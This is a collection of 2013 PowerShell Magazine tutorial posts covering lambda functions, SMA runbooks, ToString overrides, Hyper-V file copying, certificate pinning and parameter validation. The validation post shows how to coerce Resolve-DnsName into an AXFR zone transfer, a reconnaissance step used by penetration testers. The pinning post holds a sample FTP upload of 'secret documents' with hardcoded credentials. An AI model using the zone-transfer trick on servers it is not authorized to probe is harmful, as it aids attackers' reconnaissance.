Update-TypeData to “attach” new functionality to .NET types. Check the help of Update-TypeData for more information and code examples.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/12/26/pstip-extending-type-data/","tags":["Tips and Tricks"],"title":"#PSTip Extending Type Data"},{"categories":["How To"],"contents":"Scenario: You have a large dataset and need to perform various transformations on the data. For example, let’s say you need to multiply a sequence by a variable constant and you need to add a sequence by a variable constant. If you’re going to perform this task many times, naturally, it would make sense to write a function that performs these operations. For example, these functions might manifest themselves in the following way:\nfunction Add { param ( [Int] $Constant, [ValidateNotNullOrEmpty()] [Int[]] $Sequence ) foreach ($Object in $Sequence) { Write-Output ($Object + $Constant) } } function Multiply { param ( [Int] $Constant, [ValidateNotNullOrEmpty()] [Int[]] $Sequence ) foreach ($Object in $Sequence) { Write-Output ($Object * $Constant) } } Add 2 @(1, 2, 3, 4, 5) Multiply 5 @(1, 2, 3, 4, 5)  Sure, defining these functions is easy enough, but what if hundreds of transformations are necessary? Defining hundreds of helper functions would obviously be tedious and would clutter your script. Rather than declaring a function that describes how to transform each element, what if we could just apply a simple transformation to each element that didn’t require a function definition? This can be accomplished with lambda functions.\nA lambda function is a nameless (i.e. anonymous) function that accepts arguments and returns the result of a simple operation that doesn’t affect variables outside of its scope. In PowerShell lingo, a lambda function is simply a script block with a ‘param’ declaration.\nNow that I’ve confused you with this abstract concept, allow me to show you some examples to put things into perspective. Here’s a sample lambda function in PowerShell that simply multiplies a number by two:\n$Double = { param($x) $x * 2 }  To invoke the lambda function, you simply prefix it with the call operator (\u0026amp;) or the Invoke method.\n\u0026$Double 2 $Double.Invoke(2)  So now let’s apply arbitrary lambda functions to a dataset. As an example, I’m going to replicate the ‘map’, ‘reduce’, and ‘filter’ functions in Python. The ‘map’ function applies a function to each element of a sequence. The ‘reduce’ function applies a function with two arguments cumulatively to a sequence of objects, hence ‘reducing’ the dataset to a single object. Finally, the ‘filter’ function returns a subset of objects from a sequence when a function evaluates to true. Here is a simple PowerShell implementation of each of these functions:\n#requires -Version 3 # Ast parameter validation is used to ensure that the lambda # function passed in has either one or two parameters. function Map-Sequence { param ( [Parameter(Mandatory)] [ValidateScript({ $_.Ast.ParamBlock.Parameters.Count -eq 1 })] [Scriptblock] $Expression, [Parameter(Mandatory)] [ValidateNotNullOrEmpty()] [Object[]] $Sequence ) $Sequence | % { \u0026amp;$Expression $_ } } function Reduce-Sequence { param ( [Parameter(Mandatory)] [ValidateScript({ $_.Ast.ParamBlock.Parameters.Count -eq 2 })] [Scriptblock] $Expression, [Parameter(Mandatory)] [ValidateNotNullOrEmpty()] [Object[]] $Sequence ) $AccumulatedValue = $Sequence[0] if ($Sequence.Length -gt 1) { $Sequence[1..($Sequence.Length - 1)] | % { $AccumulatedValue = \u0026amp;$Expression $AccumulatedValue $_ } } $AccumulatedValue } function Filter-Sequence { param ( [Parameter(Mandatory)] [ValidateScript({ $_.Ast.ParamBlock.Parameters.Count -eq 1 })] [Scriptblock] $Expression, [Parameter(Mandatory)] [ValidateNotNullOrEmpty()] [Object[]] $Sequence ) $Sequence | ? { \u0026amp;$Expression $_ -eq $True } }  Now that we have these helper functions in place, we can easily apply transformations to sets of data without needing to define traditional (i.e. imperative) functions. Consider the following examples:\n$IntArray = @(1, 2, 3, 4, 5, 6) $Double = { param($x) $x * 2 } $Sum = { param($x, $y) $x + $y } $Product = { param($x, $y) $x * $y } $IsEven = { param($x) $x % 2 -eq 0 } Map-Sequence $Double $IntArray Reduce-Sequence $Sum $IntArray Reduce-Sequence $Product $IntArray Filter-Sequence $IsEven $IntArray The ‘Map-Sequence’ example is a one-liner that doubles each element of an array. The ‘Reduce-Sequence’ one-liner calculates the sum of the elements of an array. It then calculates the product of an array. Finally, the ‘Filter-Sequence’ one-liner returns only even numbers from the array.\nHopefully, now you can see just how easy it can be to perform simple transformations to data without needing to define functions for each transformation. By using lambda functions in your scripts, you can greatly simplify your code!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/12/23/simplifying-data-manipulation-in-powershell-with-lambda-functions/","tags":["How To"],"title":"Simplifying Data Manipulation in PowerShell with Lambda Functions"},{"categories":["How To","Service Management Automation"],"contents":"Hey Readers. In this article, I wanted to take the opportunity to talk about a scenario that may be “edge case” but a case just the same within the constructs of leveraging switch parameters in PowerShell workflow. In fact, this scenario becomes less of an edge case as you start to write SMA Runbooks that leverage nested Runbooks. Still don’t know what SMA is and want more information? Check out the series http://aka.ms/IntroToSMA and my first article for PowerShell Magazine here for more information.\nScenario For me, a journey started with PowerShell workflow as I started diving into SMA (Service Management Automation). SMA leverages PowerShell workflow under the hood for its automation engine. Due to the nature of how SMA uses inline Runbooks (PowerShell workflow) to execute tasks and return back to the main calling Runbook, certain behaviors exist that may be unexpected. In this scenario, the switch parameter capabilities get somewhat lost and your approach will need to change to accommodate. Here are some examples to illustrate.\nExample 1 Executing a PowerShell workflow directly specifying a switch parameter (not nested)\nWorkflow Invoke-NestedWorkflow { Param([switch]$SomeSwitch) $SomeSwitch.IsPresent } Invoke-NestedWorkflow -SomeSwitch A switch parameter was sent that should indicate a value of True and in fact was validated as True. No surprises.\nExample 2 To mimic a nested Runbook in SMA, I’ve combined two workflows and am leveraging a switch parameter.\nWorkflow Invoke-NestedWorkflow { Param([switch]$SomeSwitch) \u0026quot;I'm in the nested Runbook\u0026quot; $SomeSwitch.IsPresent } Workflow Invoke-ParentWorkflow { \u0026quot;I'm in the parent Runbook\u0026quot; Invoke-NestedWorkFlow -SomeSwitch } Invoke-ParentWorkflow This time you\u0026rsquo;ll notice that as we send -SomeSwitch into the nested workflow, it is not interpreted properly and we receive an error message. [PowerShell v4]\nSame script [PowerShell v3 below]\nNote Different results between versions of PowerShell but error(s) still thrown.\nExample 3 In order to retain the switch parameter, you have to do some extra work and it isn’t necessarily as clean as a native PowerShell switch parameter usually is. Specifying **-SomeSwitch:**$True now allows you to retain the “$True” through the execution on this switch parameter. But it isn’t pretty :).\nWorkflow Invoke-NestedWorkflow { Param([switch]$SomeSwitch) \u0026quot;I'm in the nested Runbook\u0026quot; $SomeSwitch.IsPresent } Workflow Invoke-ParentWorkflow { \u0026quot;I'm in the parent Runbook\u0026quot; Invoke-NestedWorkFlow -SomeSwitch:$true } Invoke-ParentWorkflow (no errors and True retained)\n[Recommendation]\nWhy not use Boolean? We’re nearly there anyway at this point. See below, the call to the parent Runbook is now using -SomeSwitch $True. Instead of -SomeSwitch:$True and the parameter types have been updated to [bool].\nWorkflow Invoke-NestedWorkflow { Param([bool]$SomeSwitch) \u0026quot;I'm in the nested Runbook\u0026quot; $SomeSwitch } Workflow Invoke-ParentWorkflow { \u0026quot;I'm in the parent Runbook\u0026quot; Invoke-NestedWorkFlow -SomeSwitch $true } Invoke-ParentWorkflow  -SomeSwitch is now a Boolean parameter and should be renamed of course, but left “as is” for consistency.\n Summary and Takeaways So in summary, switch parameters used in SMA (and nested PowerShell workflow) can still be used but require some modifications to function properly. Taking a closer look, Booleans fit nicely here and take on their native look at feel so why not use them instead! Want to get a bit more information on where this topic came from? Check out this blog post Automation–Service Management Automation–SMA Runbook Toolkit Spotlight–SMART for Runbook Import and Export on the Building Clouds blog that triggered this topic where Aleksandar Nikolic and me debated on this subject which ended up driving quality and awareness around SMA and PowerShell workflow!\nTill next time …\nHappy Automating!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/12/20/using-powershell-switch-vs-boolean-parameters-in-sma-runbooks/","tags":["How To","Service Management Automation"],"title":"Using PowerShell Switch vs. Boolean Parameters in SMA Runbooks"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn this neat tip Jakub showed a way to control the output of the ToString method by exposing a ToString function. What if you can’t intervene with code or don’t have access to it? Consider the following example:\nPS\u0026gt; $gps = Get-Process s* | Select-Object -First 3 PS\u0026gt; \u0026quot;The first 3 service names are: $gps\u0026quot; The first 3 service names are: System.Diagnostics.Process (SearchIndexer) System.Diagnostics.Process (services) System.Diagnostics.Process (SettingSyncHost) You can see that when the variable that holds the processes is converted to a string, the ToString method of each process returns the .NET type name followed by the process name in parenthesis. Obviously this is not the way we want to present the data. Let’s see how we can override the ToString method of System.Diagnostics.Process (or any other object):\nPS\u0026gt; $gps = Get-Process s* | Select-Object -First 3 | Add-Member -MemberType ScriptMethod -Name ToString -Value {$this.Name} -PassThru -Force PS\u0026gt; \u0026quot;The first 3 service names are: $gps\u0026quot; The first 3 service names are: SearchFilterHost SearchIndexer SearchProtocolHost Excellent, now we get just the names. To introduce your own ToString method you use the Add-Member cmdlet to add a new ScriptMethod called ToString.\nIn the Value scriptblock, $this represents the current object flowing through the cmdlet and we use it to return the Name of the object (process object in our case).\nBecause each object already has a ToString method we add the Force switch to override it, and we also add the PassThru switch to write the extended object back to the pipeline.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/12/19/pstip-overriding-the-tostring-method-part-ii/","tags":["Tips and Tricks"],"title":"#PSTip Overriding the ToString() Method, part II"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn this very helpful tip, Bartek shown us how to create a custom object using the New-Module cmdlet and how to constrain the data the object can hold. Bartek ‘s object represents a user, and almost every time I consume a “user” object the information I care about the most is the user’s full name. So I was wondering what would be the most convenient way to get such information and I realized I want to be able to do “$User is now logged on.” and get “John Doe is now logged on.”, but I’ve tried it and got “@{BirthDate=12/17/1978 00:00:00; FirstName=John; LastName=Doe} is now logged on.”.\nSo I experimented with it and it turns out all I had to do is define (and export) a ToString function which will output the correct data when the variable will be embedded inside a string.\nfunction New-User { param ( [String]$FirstName, [String]$LastName, [DateTime]$BirthDate ) New-Module { param ( $fn, $ln, $bd ) [String]$FirstName = $fn [String]$LastName = $ln [DateTime]$BirthDate = $bd function ToString {\u0026quot;$FirstName $LastName\u0026quot; } Export-ModuleMember -Variable FirstName, LastName, BirthDate -Function ToString } -AsCustomObject -ArgumentList $FirstName,$LastName,$BirthDate }  #Create a new user... PS\u0026gt; $User = New-User -FirstName John -LastName Doe -BirthDate 12/17/1978 #...and use it: PS\u0026gt; \u0026quot;$User is now logged on.\u0026quot; John Doe is now logged on. #Not surprisingly it works with other ways of converting to String too: PS\u0026gt; $User.ToString() + \u0026quot; is the best!\u0026quot; John Doe is the best! PS\u0026gt; [string]$User John Doe ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/12/18/pstip-overriding-the-tostring-method/","tags":["Tips and Tricks"],"title":"#PSTip Overriding the ToString() Method"},{"categories":["News"],"contents":"Today is PowerShell Magazine Day at Manning Books. Save 50% on these selected books. Just enter dotd1217cc in the Promotional Code box when you check out at manning.com to save half. Offer expires at midnight EST December 17, 2013.\nOffer applies to these selected books:\n Learn PowerShell Toolmaking in a Month of Lunches Learn Windows PowerShell 3 in a Month of Lunches Learn SCCM 2012 in a Month of Lunches Learn Active Directory Management in a Month of Lunches Learn SQL Server Administration in a Month of Lunches  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/12/17/powershell-magazine-day/","tags":["News"],"title":"PowerShell Magazine Day!"},{"categories":["Hyper-V","Tips and Tricks"],"contents":"In an earlier article, I showed you how to use the Copy-VMFile cmdlet. However, if you have paid attention and really used it, you will know that it cannot be used to copy a folder completely with its contents in a recursive manner.\nCopying each and every single file isn’t a great experience, right?\nLet us see how we can copy a complete folder to a VM.\nGet-ChildItem C:\\Scripts -Recurse -File | % { Copy-VMFile \"WC7-1\" -SourcePath $_.FullName -DestinationPath $_.FullName -CreateFullPath -FileSource Host }  Observe the -File switch parameter in the command above. It is needed because the Copy-VMFile is capable of copying files only. So, if it encounters a folder, it simply fails. So, with the above command empty folders on the source path will not be created at the target because of the -File switch parameter.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/12/17/pstip-copying-folders-using-copy-vmfile-cmdlet-in-windows-server-2012-r2-hyper-v/","tags":["Tips and Tricks","Hyper-V"],"title":"#PSTip Copying folders using Copy-VMFile cmdlet in Windows Server 2012 R2 (Hyper-V)"},{"categories":["How To"],"contents":"Recently, we have seen in the news how governments intercept communications. We’ve seen evidence that they are abusing their powers against those who run valid Certificate Authorities, creating fraudulent certificates to intercept SSL/TLS encrypted communications. Criminals have also succeeded in such schemes, as with DigiNotar.\nCurrently, we work with SSL/TLS by using a chain of trust, where we trust CAs and their root certificates in our applications. We use certificate pinning, where we check the thumbprint or public key of the certificate to remove the “conference of trust”. When we pin a certificate or public key, we no longer must depend on others to make peer identity security decisions.\nIn Windows PowerShell, we have several ways of performing certificate pinning. Let’s start with the one that will work on Windows PowerShell 2.0, 3.0 and 4.0. We validate our work by using the .NET Framework System.Net.ServicePointManager class. The client validates the server certificate by using a code block to which we have assigned the class property ServerCertificateValidationCallback. If the code block returns a Boolean value of True, then the validation passed; it returns False if it did not.\nBecause we can create several callbacks, we start by limiting the maximum number to one, and limiting the idle time of the service point before it is eligible for garbage collection. A ServicePoint object is idle when the list of connections associated with the object is empty. This way, we can reset it to its default behavior. We can also change the code block, and validate another certificate for use against another site. (Thanks to James Forshaw for helping me to figure this out.)\n[Net.ServicePointManager]::MaxServicePoints = 1 [Net.ServicePointManager]::MaxServicePointIdleTime = 1 We now set the code block we will use to validate the certificate:\n[Net.ServicePointManager]::ServerCertificateValidationCallback = { $ThumbPrint = \u0026quot;91a6316868bb63d7203f2594da582386210b698\u0026quot; $certificate = [System.Security.Cryptography.X509Certificates.X509Certificate2]$args[1] if ($certificate -eq $null) { $Host.UI.WriteErrorLine(\u0026quot;Null certificate.\u0026quot;) return $false } if ($certificate.Thumbprint -eq $ThumbPrint) { return $true } else { $Host.UI.WriteErrorLine(\u0026quot;Thumbprint mismatch. Certificate thumbprint $($certificate.Thumbprint)\u0026quot;) } return $false }  In the preceding example, we check only the certificate thumbprint saved in a variable. We cast the second argument to the X509Certificate2 type, since this type includes the thumbprint information in its properties. If the code block returns True, the certificate is accepted; if False, it fails validation, and the connection is terminated.\nFirst, we check for a null certificate, which can happen if our connection was redirected (such as with a SSLStrip attack). Because we are working with a callback, to show a message, we must use $Host.UI. Next, we compare the thumbprint of the certificate obtained from the connection to the one we are expecting to validate the host.\nThe callback runs each time we use the .NET Framework System.Net.WebRequest, System.Net.FtpWebRequest, or System.Net.WebClient classes. Because the failure to validate results in an exception, we must control the execution of our code.\nTry { # Create web request $WebRequest = [Net.WebRequest]::Create(\u0026quot;https://encrypted.google.com/\u0026quot;) # Get response stream $ResponseStream = $webrequest.GetResponse().GetResponseStream() # Create a stream reader and read the stream returning the string value. $StreamReader = New-Object System.IO.StreamReader -ArgumentList $ResponseStream $StreamReader.ReadToEnd() } catch { Write-Error \u0026quot;Failed: $($_.exception.innerexception.message)\u0026quot; }  If the server is going through a proxy (in this example, I have my system using Burp Proxy with a self-signed certificate), I will get an error, and a description of why:\nPS\u0026gt; C:\\Users\\Carlos\\Desktop\\certpin.ps1 Thumbprint mismatch. Certificate thumbprint 91A6316868BB63D7203F2594DA582386210CB698 C:\\Users\\Carlos\\Desktop\\certpin.ps1 : Failed: The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel. + CategoryInfo : NotSpecified: (:) [Write-Error], WriteErrorException + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,certpin.ps1 The entire example code follows:\n[Net.ServicePointManager]::MaxServicePoints = 1 [Net.ServicePointManager]::MaxServicePointIdleTime = 1 [Net.ServicePointManager]::ServerCertificateValidationCallback = { $ThumbPrint = \u0026quot;91a6316868bb63d7203f2594da582386210cb698\u0026quot; $certificate = [System.Security.Cryptography.X509Certificates.X509Certificate2]$args[1] if($certificate -eq $null) { $Host.UI.WriteErrorLine(\u0026quot;Null certificate.\u0026quot;) return $false } if ($certificate.Thumbprint -eq $ThumbPrint) { return $true } else { $Host.UI.WriteErrorLine(\u0026quot;Thumbprint mismatch. Certificate thumbprint $($certificate.Thumbprint)\u0026quot;) } return $false } Try { # Create web request $WebRequest = [Net.WebRequest]::Create(\u0026quot;https://encrypted.google.com/\u0026quot;) # Get response stream $ResponseStream = $webrequest.GetResponse().GetResponseStream() # Create a stream reader and read the stream returning the string value. $StreamReader = New-Object System.IO.StreamReader -ArgumentList $ResponseStream $StreamReader.ReadToEnd() } catch { Write-Error \u0026quot;Failed: $($_.exception.innerexception.message)\u0026quot; }  If you are using Windows PowerShell 4.0, you can simplify the process, and use the ServerCertificateValidationCallback property of a System.Net.WebRequest object. You can limit it to that object, eliminating the need to modify the service point manager. Here is the code.\nTry { # Create web request $WebRequest = [System.Net.WebRequest]::Create(\u0026quot;https://encrypted.google.com/\u0026quot;) # Set the callback to check for null certificate and thumbprint matching. $WebRequest.ServerCertificateValidationCallback = { $ThumbPrint = \u0026quot;91a6316868bb63d7203f2594da582386210cb698\u0026quot; $certificate = [System.Security.Cryptography.X509Certificates.X509Certificate2]$args[1] if ($certificate -eq $null) { $Host.UI.WriteWarningLine(\u0026quot;Null certificate.\u0026quot;) return $false } if ($certificate.Thumbprint -eq $ThumbPrint) { return $true } else { $Host.UI.WriteWarningLine(\u0026quot;Thumbprint mismatch. Certificate thumbprint $($certificate.Thumbprint)\u0026quot;) } return $false } # Get response stream $ResponseStream = $webrequest.GetResponse().GetResponseStream() # Create a stream reader and read the stream returning the string value. $StreamReader = New-Object System.IO.StreamReader -ArgumentList $ResponseStream $StreamReader.ReadToEnd() } catch { Write-Error \u0026quot;Failed: $($_.exception.innerexception.message)\u0026quot; }  Here is another example, using FTP over SSL to upload a file:\n[Net.ServicePointManager]::MaxServicePoints = 1 [Net.ServicePointManager]::MaxServicePointIdleTime = 1 [Net.ServicePointManager]::ServerCertificateValidationCallback = { $ThumbPrint = \u0026quot;c3c6d4ca0f778817d322cb61302f77a19c285798\u0026quot; $certificate = [System.Security.Cryptography.X509Certificates.X509Certificate2]$args[1] if ($certificate -eq $null) { $Host.UI.WriteErrorLine(\u0026quot;Null certificate.\u0026quot;) return $false } if ($certificate.Thumbprint -eq $ThumbPrint) { return $true } else { $Host.UI.WriteErrorLine(\u0026quot;Thumbprint mismatch. Certificate thumbprint $($certificate.Thumbprint)\u0026quot;) } return $false } Try { #create the FtpWebRequest and configure it $ftp = [System.Net.FtpWebRequest]::Create(\u0026quot;ftp://192.168.6.158/secretdocuments.zip\u0026quot;) $ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile $ftp.Credentials = New-Object System.Net.NetworkCredential(\u0026quot;snowden\u0026quot;,\u0026quot;5up3r53cr37\u0026quot;) $ftp.UseBinary = $true $ftp.UsePassive = $true $ftp.EnableSsl = $true # read in the file to upload as a byte array $content = [System.IO.File]::ReadAllBytes(\u0026quot;C:\\Windows\\Temp\\secretdocument.zip\u0026quot;) $ftp.ContentLength = $content.Length # get the request stream, and write the bytes into it $rs = $ftp.GetRequestStream() $rs.Write($content, 0, $content.Length) # be sure to clean up after ourselves $rs.Close() $rs.Dispose() } catch { Write-Error \u0026quot;Failed: $($_.exception.innerexception.message)\u0026quot; }  You can use this method when you download information from an HTTPS protected site to validate the confidentiality of the information and the integrity of the data during transport. It can also be used to upload a file to a WebDav Share, or via FTP using SSL. This method ensures that no “man in the middle” attack can steal or modify the information.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/12/17/powershell-certificate-pinning/","tags":["How To"],"title":"PowerShell Certificate Pinning"},{"categories":["How To","Hyper-V"],"contents":"With Windows Server 2012 R2, the Hyper-V product team introduced a new cmdlet called Copy-VMFile. This, as the name implies, help you copy a file into a Hyper-V Virtual Machine (VM). A much needed functionality, in my opinion. The syntax for copying a file is simple.\nCopy-VMFile \"WC7-1\" -SourcePath C:\\Scripts\\test.txt -DestinationPath C:\\Scripts\\test.txt -FileSource Host  For the above operation to succeed, VM must have the C:\\Scripts folder. If not, you will see an error that the system cannot find the file specified. This is where the _-CreateFullPath _parameter can be used to create the destination folder if it does not exist.\nCopy-VMFile \"WC7-1\" -SourcePath C:\\Scripts\\test.txt -DestinationPath C:\\Scripts\\test.txt -FileSource Host -CreateFullPath  Now, there are certain things you need to know before you start using this.\n#1. Update Integration Service Components Like I mentioned earlier, this cmdlet is a part of Windows Server 2012 R2 Hyper-V release. So, the guest OS must be running the same level of integration components. You can use the Hyper-V cmdlet Get-VM to check the version of the integration services. Here is a sample snippet I use.\nGet-VM | Select Name, IntegrationServicesVersion, @{Name=\"IsUpdateNeeded\";Expression={$_.IntegrationServicesVersion -lt [version]'6.3.9600.16384'}}  #2. Ensure Guest Service Interface component is enabled Once you verify that the integration services version is 6.3.9600.16834, proceed to check if the Guest Service Interface component in the integration services is enabled or not. Again, we can do this using the Hyper-V cmdlets. This service must be enabled if you want to use the Copy-VMFile cmdlet to copy files into a VM.\nGet-VM | Get-VMIntegrationService -Name \"Guest Service Interface\" | Select VMName, Enabled  As you see in the above output, the Guest Service Interface component is not enabled on WS08-R2-1 virtual machine. Let us see what happens when I try to copy a file.\nYou can enable this integration service component by using the Enable-VMIntegrationService cmdlet.\nGet-VM WS08-R2-1 | Get-VMIntegrationService -Name \"Guest Service Interface\" | Enable-VMIntegrationService -Passthru  After enabling the Guest Service Interface component in the VM, you should be able to copy a file from host to guest.\n#3. What if you are still unable to copy the file into a VM? Yes, I know, there is a chance. If you still encounter issues while using the Copy-VMFile cmdlet, check the integration services status inside the guest. For this, run the following command in the guest Operating System.\nGet-Service -Name *vm*  As you see, if the vmicguestinterface service is stopped inside the guest OS, we won’t be able to use Copy-VMFile cmdlet to copy files. So, all you need to do is start the service and ensure it is set to automatic start mode.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/12/16/using-copy-vmfile-cmdlet-in-windows-server-2012-r2-hyper-v/","tags":["Hyper-V","How To"],"title":"Using Copy-VMFile cmdlet in Windows Server 2012 R2 Hyper-V"},{"categories":["How To","Azure Pack"],"contents":"Service Management Automation (SMA) So, what exactly is SMA and why is it important in the world of PowerShell? I’ll start with a link where you can read even more information at your leisure http://aka.ms/IntroToSMA. This link starts off with the basics and then introduces you to some of the concepts. However, to give you a general idea, SMA is an automation engine that ships with System Center Orchestrator that is leveraged by the Windows Azure Pack (WAP) built entirely on Windows PowerShell Workflow. Think a Silverlight UI that looks like Azure with PowerShell Workflow under the hood leveraged for automation of that solution.\nSMA Runbook Toolkit (SMART) for Runbook Import and Export Now that we’ve gotten the formalities out of the way, I wanted to dive into some specifics around a new solution I put together for SMA that will streamline the process of sharing PowerShell Workflows (SMA Runbooks). True, this solution directly leverages SMA, so in order to really appreciate it, you’ll need to dive into the intro above and get your hands on the solution. However, it may pique your interest enough to investigate it a bit and see the power of the solution [then I’ve done my job too J – after all I want you to do more than just read about it – “kick the tires” and let me know what you think]. You can read in depth about it here: Automation–Service Management Automation–SMA Runbook Toolkit Spotlight–SMART for Runbook Import and Export but I’m also going to give you the basic details in summary within this article so please read on!\nSolution Breakdown  A set of SMA Runbooks and PowerShell Workflow scripts to assist in the import and export of SMA Runbooks into and out of SMA Provides a mechanism to encapsulate a set of Runbooks and properties around those Runbooks into a compilation of atomic XML files that create a portable and easily sharable solution between environments Can facilitate source backup into a repository on a scheduled basis to ensure SMA Runbooks are backed up on a regular basis (with a broad range of properties that encompass those Runbooks) Streamlines the process of automated import and export beyond the provided PowerShell cmdlets that come with the SMA solution Boolean parameters allow for flexible management of property export and import (you choose what you want to import and export and how)  Contents of the Solution Download The SMART for Runbook Import and Export comes with a series of PowerShell scripts, XML files (atomic SMA Runbooks), and a User Guide to get you started.\n  Install-SMARTForRunbookImportAndExport.ps1: Installation wrapper to get the solution installed within your SMA environment–right click and “Run with PowerShell”. The result will be (4) Runbooks imported into your SMA environment that include tags for easy searching.\n  Export-SMARunbookToXML: This is essentially the Runbook version of the PowerShell version Export-SMARunbookToXML.ps1\n  Import-SMARunbookfromXMLorPS1: This is the Runbook version of Import-SMARunbookfromXMLorPS1.ps1\n  Invoke-SMARunbookExport: This Runbook provides a wrapper framework for executing an SMA Runbook Export   Invoke-SMARunbookImport: This Runbook provides a wrapper framework for executing an SMA Runbook Import   Summary – Closing Remarks In closing, I want to thank you for checking out this article and providing any feedback or comments to the solution I’ve covered here. I definitely recommend taking a closer look at the following supporting blog post that also provides the direct download for this PowerShell-based solution. Automation–Service Management Automation–SMA Runbook Toolkit Spotlight–SMART for Runbook Import and Export and Happy Automating! J\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/12/11/be-smart-with-windows-azure-pack-and-sma/","tags":["How To","Azure Pack"],"title":"Be “SMART” with Windows Azure Pack and SMA"},{"categories":["How To"],"contents":"Parameter validation in PowerShell is an extremely useful and easy way to alert a user as early as possible that incorrect input was provided to a function or cmdlet. The following attributes are available to you for performing explicit parameter validation (taken from MSDN):\nValidateCount Specifies the minimum and maximum number of arguments that a parameter can accept. For more information about the syntax used to declare this attribute, see ValidateCount Attribute Declaration.\nValidateLength Specifies the minimum and maximum number of characters in the parameter argument. For more information about the syntax used to declare this attribute, see ValidateLength Attribute Declaration.\nValidatePattern Specifies a regular expression that validates the parameter argument. For more information about the syntax used to declare this attribute, see ValidatePattern Attribute Declaration.\nValidateRange Specifies the minimum and maximum values of the parameter argument. For more information about the syntax used to declare this attribute, see ValidateRange Attribute Declaration.\nValidateSet Specifies the valid values for the parameter argument. For more information about the syntax used to declare this attribute, see ValidateSet Attribute Declaration.\nWhen validating parameters, it is important to make sure your validation attributes make sense though. For example, consider the following simple function that returns the status of a TCP connection:\nfunction Test-TcpConnection { Param ( [String]$IPAddress, [ValidateRange(1, 2147483647)] [Int32]$Port ) $TcpClient = New-Object System.Net.Sockets.TCPClient try { $TcpClient.Connect($IPAddress, $Port) } catch [System.Net.Sockets.SocketException] { } finally { $TcpClient.Connected $TcpClient.Close() } }  Those comfortable with networking should recognize that the ValidateRange attribute doesn’t make sense since a port number is an unsigned, 16-bit value – i.e. 0-65535. You would be surprised to see how many built-in PowerShell cmdlets use nonsensical ValidateRange arguments. Naturally, it would make more sense to provide the following ValidateRange attribute:\n[ValidateRange(1, 65535)]  Now, the validation attributes are nice and they certainly have their place but often times they are not necessary. By choosing proper data types as parameters to your functions, you will often get parameter validation for free (i.e. implicit validation). Consider the following improvement to the Test-TcpConnection function:\nfunction Test-TcpConnection { Param ( [System.Net.IPAddress]$IPAddress, [ValidateRange(1, [UInt16]::MaxValue)] [UInt16]$Port ) $TcpClient = New-Object System.Net.Sockets.TCPClient try { $TcpClient.Connect($IPAddress, $Port) } catch [System.Net.Sockets.SocketException] { } finally { $TcpClient.Connected $TcpClient.Close() } }  By making the IPAddress parameter an IPAddress object, it will automatically parse the IP address provided. No complicated regular expressions required! For example, it will throw an error upon attempting to execute the following command:\nTest-TcpConnection 0.0.0.300 80  It is also worth noting that the ValidateRange attribute is still necessary for the Port parameter because the “connect” method will not accept a port number of 0.\nStarting in PowerShell v3, you also get automatic tab completion if you use the ValidateSet attribute or use an enum type as one of your parameters. Consider the following contrived example:\nfunction Get-Poem { Param ( [ConsoleColor] $Color1, [ConsoleColor] $Color2 ) Write-Host \u0026quot;Roses are $Color1, violets are $Color2, PowerShell is great and it is Blue.\u0026quot; }  Using the ConsoleColor enum as parameters provides two benefits:\n Only colors defined in the ConsoleColor enum will be accepted (in theory… more on this in a moment). You will get automatic tab completion when typing in the colors in PS v3 and v4- e.g. Get-Poem Re[TAB] Blu[TAB]  Now, there is a subtle characteristic of enums in .NET that can lead to undefined behavior: you can call the Parse method on an enum and have it return to you an undefined enum value. Consider the following example:\nGet-Poem ([Enum]::Parse([ConsoleColor], 200)) ([Enum]::Parse([ConsoleColor], 42))  Roses are 200, violets are 42, PowerShell is great and it is Blue.\nObviously, I never intended for this behavior to occur. In fact, most people would think that they would be explicitly preventing this sort of thing from happening! If you were truly concerned about ensuring proper parameter validation, you would need to provide the following validation attribute for each parameter:\n[ValidateScript({ [Enum]::IsDefined($_.GetType(), $_) })]  This ensures that the enum value you provided is an actual, defined value.\nNow, to put things into perspective, I’ll provide an example of a built-in cmdlet introduced in PowerShell v3 that exhibits a lack of parameter validation that ultimately leads to undefined behavior – Resolve-DnsName.\nResolve-DnsName allows you to query individual DNS records of various types. You specify the record type through the “Type” parameter which accepts an enum of type [Microsoft.DnsClient.Commands.RecordType]. To view all of the defined record types, run the following:\n[Microsoft.DnsClient.Commands.RecordType] | Get-Member -Static -MemberType Property  When I saw the list of record types, I noticed that a specific type was missing – AXFR (zone transfer). Penetration testers will often attempt to perform a zone transfer on a potentially misconfigured DNS server in order to get a listing of every DNS record in the zone specified. A successful unauthorized zone transfer is a potential treasure trove of actionable intelligence for an attacker. Naturally, I would have liked it if Resolve-DnsName would let you perform zone transfers (like nslookup.exe does) but unfortunately, there is no “AXFR” defined in the RecordType enum. Fortunately, we can use our new trick to force AXFR (0xFC) to be used:\nResolve-DnsName -Name zonetransfer.me -Type ([Enum]::Parse([Microsoft.DnsClient.Commands.RecordType], 0xfc)) -Server '209.62.64.46' -TcpOnly  If you ran this command, you would find that it only returns a single SOA entry. If you ran the command with Wireshark running, however, you would see that a zone transfer was actually performed. Unfortunately, Resolve-DnsName wasn’t designed to parse multiple records from a zone transfer but this is undefined behavior, nonetheless.\nSo, when choosing parameters you should follow this advice:\n Choose your parameter types wisely. Often choosing an appropriate type will provide implicit validation. Use parameter validation attributes as often as possible. Just make sure they make sense in the first place though. Beware of people like me that will try to exploit undefined behavior in your functions/cmdlets. 🙂  